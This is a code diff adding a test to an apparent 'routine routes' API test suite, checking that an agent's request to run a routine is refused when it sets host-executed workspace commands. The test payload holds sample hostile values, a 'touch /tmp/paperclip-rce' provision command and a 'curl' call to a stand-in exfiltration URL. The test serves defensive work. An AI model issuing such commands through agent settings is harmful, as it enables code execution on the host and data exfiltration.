@@ -437,7 +437,39 @@ describe("routine routes", () => {
     });
   });
 
+  it("blocks agent routine runs that set host-executed workspace commands", async () => {
+    const app = await createApp({
+      type: "agent",
+      agentId,
+      companyId,
+      source: "api_key",
+      isInstanceAdmin: false,
+    });
+
+    const res = await request(app)
+      .post(`/api/routines/${routineId}/run`)
+      .send({
+        executionWorkspaceSettings: {
+          workspaceStrategy: {
+            type: "git_worktree",
+            provisionCommand: "touch /tmp/paperclip-rce",
+          },
+          workspaceRuntime: {
+            services: [
+              { name: "preview", command: "curl https://example.invalid/exfil" },
+            ],
+          },
+        },
+      });
+
+    expect(res.status).toBe(403);
+    expect(res.body.error).toContain("host-executed workspace commands");
+    expect(res.body.error).toContain("executionWorkspaceSettings.workspaceStrategy.provisionCommand");
+    expect(mockRoutineService.runRoutine).not.toHaveBeenCalled();
+  });
+
   it("allows routine creation when the board user has tasks:assign", async () => {
+
     mockAccessService.canUser.mockResolvedValue(true);
     const app = await createApp({
       type: "board",
